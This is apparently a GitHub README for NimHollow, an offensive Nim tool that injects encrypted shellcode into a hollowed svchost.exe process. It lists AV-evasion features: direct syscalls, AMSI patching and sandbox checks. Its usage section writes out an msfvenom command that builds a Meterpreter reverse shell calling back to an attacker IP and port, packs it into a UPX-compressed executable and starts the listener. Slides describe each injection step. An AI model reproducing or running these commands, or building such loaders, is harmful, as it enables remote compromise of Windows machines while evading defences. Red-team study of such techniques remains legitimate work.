NimHollow
==========

Playing around with the [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) technique using Nim.

Features:

* Direct syscalls for triggering Windows Native API functions with [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers).
* Shellcode encryption/decryption with [AES in CTR mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)).
* AMSI patching with @rasta-mouse's [method](https://rastamouse.me/memory-patching-amsi-bypass/).
* Simple sandbox detection techniques from the OSEP course by @offensive-security.

## Usage

Installation:

```console
~$ git clone --recurse-submodules https://github.com/snovvcrash/NimHollow && cd NimHollow
~$ sudo apt install upx -y
~$ pip3 install -r requirements.txt
```

Example:

```console
~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.13.37 LPORT=31337 EXITFUNC=thread -f raw -o shellcode.bin
~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\svchost.exe' -o hollow --upx --rm
~$ file hollow.exe
hollow.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
~$ sudo msfconsole -qr msf.rc
```

Help:

```
usage: NimHollow.py [-h] [-i IMAGE] [-o OUTPUT] [--debug] [--upx] [--rm] shellcode_bin

positional arguments:
  shellcode_bin         path to the raw shellcode file

optional arguments:
  -h, --help            show this help message and exit
  -i IMAGE, --image IMAGE
                        process image to hollow (default "C:\Windows\System32\svchost.exe")
  -o OUTPUT, --output OUTPUT
                        output filename
  --debug               do not strip debug messages from Nim binary
  --upx                 compress Nim binary with upx
  --rm                  remove Nim files after compiling the binary
```

## Process Hollowing in Slides

1\. Create the target process (e.g., `svchost.exe`) in a suspended state.

![](https://user-images.githubusercontent.com/23141800/132571935-07adfa73-f33d-4c37-b21c-7f8534699a8d.png)

2\. Query created process to extract its base address pointer from PEB (**P**rocess **E**nvironment **B**lock).

![](https://user-images.githubusercontent.com/23141800/132571944-de967c1f-1518-4d91-a4d6-4d63120017d7.png)

3\. Read 8 bytes of memory (for 64-bit architecture) pointed by the image base address *pointer* in order to get the actual value of the image base address.

![](https://user-images.githubusercontent.com/23141800/132571951-fb9b08b4-b6ab-4ae9-9387-e6f316fd4500.png)

4\. Read 200 bytes of the loaded EXE image and parse PE structure to get the EntryPoint address.

![](https://user-images.githubusercontent.com/23141800/132571964-588c830e-de06-4b09-a708-b32c4150a17c.png)

5\. Write the shellcode to the EntryPoint address and resume thread execution.

![](https://user-images.githubusercontent.com/23141800/132572990-cee11f80-59d4-4fd2-a7f7-245805554b35.png)

## Credits

* @ajpc500 for the [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers) project.
* @byt3bl33d3r for the [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim/) repository.
* @S3cur3Th1sSh1t and @chvancooten for Nim [code](https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim) [snippets](https://github.com/byt3bl33d3r/OffensiveNim/issues/16).
